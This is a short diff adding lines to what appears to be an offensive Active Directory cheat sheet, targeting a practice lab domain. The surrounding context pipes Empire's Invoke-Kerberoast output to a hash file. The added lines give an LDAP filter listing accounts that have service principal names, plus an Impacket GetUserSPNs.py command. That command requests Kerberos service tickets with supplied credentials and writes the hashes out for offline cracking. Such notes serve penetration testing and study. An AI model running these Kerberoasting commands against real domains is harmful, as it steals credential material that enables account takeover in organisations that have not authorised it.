@@ -637,6 +637,13 @@ Get-ADUser -LdapFilter "(&(objectclass=user)(objectcategory=user)(useraccountcon
 ```
 https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
 Invoke-Kerberoast -OutputFormat Hashcat | % {$_.hash} | Out-File -Encoding ascii hash.txt
+
+# 1. LDAP filter (PowerShell / AD Module style)
+Get-ADUser -LDAPFilter "(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" -Properties ServicePrincipalName
+
+# 2. Impacket’s GetUserSPNs.py
+GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/hodor:hodor -outputfile kerberoasting.hashes
+
 ```
 
 
